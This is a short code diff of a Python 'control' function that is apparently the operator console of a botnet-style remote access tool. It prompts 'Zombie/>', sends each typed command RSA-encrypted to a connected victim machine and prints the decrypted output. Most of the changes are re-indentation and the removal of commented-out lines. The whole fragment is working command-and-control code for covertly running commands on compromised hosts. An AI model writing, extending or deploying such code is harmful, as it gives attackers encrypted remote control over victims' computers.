@@ -55,21 +55,19 @@ def listen(port):
 
 def control(zombie, zombiepubkey):
 
-	try:
-		while True:	
-	#		prompt = rsa.decrypt(zombie.recv(5024), private_key).decode()	
-	#		sys.stdout.write(prompt)
+    try:
+        while True:	
 
-			d = input("Zombie/> ")
+            d = input("Zombie/> ")
 
-			if(d == "exit"):
-				break;
+            if(d == "exit"):
+                break;
+            
+            d += "\n"
+            zombie.send(rsa.encrypt(d.encode(), zombiepubkey))
 
-			d += "\n"
-			zombie.send(rsa.encrypt(d.encode(), zombiepubkey))
+            cmd = rsa.decrypt(zombie.recv(15024), private_key).decode()
+            sys.stdout.write(cmd)
 			
-			cmd = rsa.decrypt(zombie.recv(15024), private_key).decode()
-			sys.stdout.write(cmd)
-			
-	except Exception as e:
-		print("Error: " + str(e))
+    except Exception as e:
+        print("Error: " + str(e))
